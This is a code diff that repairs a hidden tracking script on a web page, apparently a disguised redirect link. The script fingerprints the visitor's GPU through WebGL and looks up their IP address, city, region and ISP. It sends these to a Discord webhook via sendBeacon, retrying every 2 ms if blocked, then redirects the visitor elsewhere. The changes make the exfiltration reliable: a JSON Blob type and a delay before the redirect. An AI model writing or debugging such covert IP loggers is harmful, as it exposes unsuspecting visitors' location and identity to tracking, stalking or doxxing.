@@ -9,7 +9,8 @@
         try {
             const gl = document.createElement('canvas').getContext('webgl');
             const d = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(d.UNMASKED_RENDERER_WEBGL).split("Apple ").pop();
+            const r = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+            return r.split("Apple ").pop().split(" (")[0];
         } catch(e) { return navigator.platform; }
     }
 
@@ -21,22 +22,24 @@
 
         while(true) {
             try {
-                // Force a fresh fetch every single time
-                const r = await fetch('https://ip-api.com/json/?nocache=' + Date.now()).then(d=>d.json());
+                const response = await fetch('https://ip-api.com/json/?cb=' + Date.now());
+                const r = await response.json();
                 
                 if(r.status === "success") {
-                    const p = { 
+                    const payload = JSON.stringify({ 
                         content: `**[${tag}]**\n**Device:** ${dev}\n**IP:** ${r.query}\n**City:** ${r.city}\n**Region:** ${r.regionName}\n**ISP:** ${r.isp}` 
-                    };
-                    navigator.sendBeacon(H, JSON.stringify(p));
-                    break; // Exit loop once sent
+                    });
+
+                    // Fixed: Added the Blob type so Discord doesn't ignore it
+                    navigator.sendBeacon(H, new Blob([payload], { type: 'application/json' }));
+                    break;
                 }
             } catch(e) { 
-                // 2ms Rapid-Fire retry if blocked
                 await new Promise(s => setTimeout(s, 2)); 
             }
         }
-        window.location.replace(Y);
+        // Small delay to make sure the beacon actually leaves the device
+        setTimeout(() => { window.location.replace(Y); }, 500);
     }
     track();
 </script>
